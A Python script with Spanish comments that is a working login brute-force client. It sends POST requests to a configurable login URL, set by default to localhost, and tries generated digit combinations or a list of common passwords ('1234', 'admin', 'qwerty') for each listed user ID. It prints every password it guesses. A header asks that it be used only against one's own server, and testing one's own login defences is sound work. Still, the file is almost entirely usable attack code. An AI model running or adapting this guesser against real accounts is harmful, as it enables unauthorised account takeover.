#!/usr/bin/env python3
"""
Cliente de prueba de login (solo el cliente).

Le pega a TU endpoint (una URL tuya) y, para cada usuario de una lista, prueba
combinaciones de contrasena. Cuando acierta, guarda y muestra por consola el
usuario con su contrasena.

IMPORTANTE: usalo SOLO contra un servidor tuyo, del que sos duenio. Probar
contrasenas contra un sitio ajeno es acceso no autorizado (ilegal).

Uso:
    python cliente.py                 # genera combinaciones (fuerza bruta) -- por defecto
    python cliente.py lista           # prueba una lista fija de contrasenas en vez de generar
"""

import sys
import string
import itertools

import requests  # si no lo tenes: pip install requests

# ================== CONFIG (ajusta esto a tu endpoint) ==================
URL = "http://127.0.0.1:8000/login"   # <-- PONE ACA TU URL / ENDPOINT
CAMPO_USUARIO = "u"                    # nombre del campo del usuario que espera tu server
CAMPO_PASS = "password"               # nombre del campo de la contrasena

# Lista de usuarios a probar (cargala vos, son de prueba).
USUARIOS = [
    "51066056",
    # "12345678",
    # "otro_usuario",
]

# Que caracteres y que largo generar en modo fuerza bruta.
# Para testear con "000" dejalo en digits (lo encuentra al toque).
CHARSET = string.digits               # ver tabla en el README para "todos los caracteres"
LARGO_MIN = 1
LARGO_MAX = 3

# Contrasenas a probar en modo "lista".
LISTA_PASS = ["1234", "admin", "password", "000", "qwerty"]
# =======================================================================


def probar(usuario, password):
    """Manda un POST de login y devuelve True si entro (codigo 200)."""
    datos = {CAMPO_USUARIO: usuario, CAMPO_PASS: password}
    try:
        r = requests.post(URL, data=datos, timeout=5)
    except requests.exceptions.ConnectionError:
        print(f"[error] no me puedo conectar a {URL} -- esta levantado tu server?")
        sys.exit(1)
    return r.status_code == 200


def buscar_por_generacion(usuario):
    """Prueba combinaciones generadas para un usuario. Devuelve la pass o None."""
    for largo in range(LARGO_MIN, LARGO_MAX + 1):
        for combo in itertools.product(CHARSET, repeat=largo):
            pw = "".join(combo)
            if probar(usuario, pw):
                return pw
    return None


def buscar_por_lista(usuario):
    """Prueba la lista fija de contrasenas para un usuario. Devuelve la pass o None."""
    for pw in LISTA_PASS:
        if probar(usuario, pw):
            return pw
    return None


def main(modo):
    buscar = buscar_por_lista if modo == "lista" else buscar_por_generacion
    print(f"[cliente] modo={modo}  usuarios a probar: {len(USUARIOS)}\n")

    encontrados = {}  # usuario -> contrasena
    for usuario in USUARIOS:
        print(f"[cliente] probando usuario {usuario}...")
        pw = buscar(usuario)
        if pw is not None:
            print(f"   >>> ADIVINADA  ->  usuario: {usuario}   contrasena: {pw}")
            encontrados[usuario] = pw
        else:
            print(f"   ...no encontre contrasena para {usuario}")

    # Resumen final por consola
    print("\n==================== RESULTADO ====================")
    if encontrados:
        for usuario, pw in encontrados.items():
            print(f"  usuario: {usuario}   contrasena: {pw}")
    else:
        print("  no se adivino ninguna contrasena")
    print("==================================================")


if __name__ == "__main__":
    modo = sys.argv[1] if len(sys.argv) > 1 else "generar"
    main(modo)
